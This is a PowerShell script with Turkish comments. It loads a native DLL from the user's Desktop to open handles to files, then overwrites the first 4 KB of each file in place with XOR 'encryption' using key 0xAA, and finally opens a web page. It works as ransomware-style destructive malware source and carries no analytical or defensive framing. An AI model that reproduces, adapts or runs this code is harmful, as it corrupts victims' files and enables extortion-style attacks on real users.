# Kernel32 API fonksiyonları
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class FileOps {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    public static extern uint SetFilePointer(IntPtr hFile, int lDistanceToMove, ref int lpDistanceToMoveHigh, uint dwMoveMethod);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Native DLL çağırma
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class FileReader {
    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="OpenAllFiles")]
    public static extern void OpenAllFiles();

    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="handlesArray")]
    public static extern IntPtr GetHandleArray();
    
    [DllImport("C:\Users\$env:USERNAME\Desktop\file_read_open.dll", EntryPoint="handleCount")]
    public static extern int GetHandleCount();
}
"@

# DLL’i çalıştır
[FileReader]::OpenAllFiles()

# Handle array’ini al
$handleCount = [FileReader]::GetHandleCount()
$handlesPtr = [FileReader]::GetHandleArray()

$handles = @()
for ($i=0; $i -lt $handleCount; $i++) {
    $ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($handlesPtr, $i*8)
    $handles += $ptr
}

# Dosyaları oku ve şifrele
foreach ($handle in $handles) {
    $bufferSize = 4096
    $buffer = New-Object byte[] $bufferSize
    $bytesRead = 0

    if ([FileOps]::ReadFile($handle, $buffer, $bufferSize, [ref]$bytesRead, [IntPtr]::Zero)) {
        for ($i=0; $i -lt $bytesRead; $i++) { $buffer[$i] = $buffer[$i] -bxor 0xAA }

        [FileOps]::SetFilePointer($handle, 0, [ref]0, 0)
        $bytesWritten = 0
        [FileOps]::WriteFile($handle, $buffer, $bytesRead, [ref]$bytesWritten, [IntPtr]::Zero)
    }

    [FileOps]::CloseHandle($handle)
}

# Web site yönlendirme
$websiteURL = "https://www.example.com"
Start-Process $websiteURL
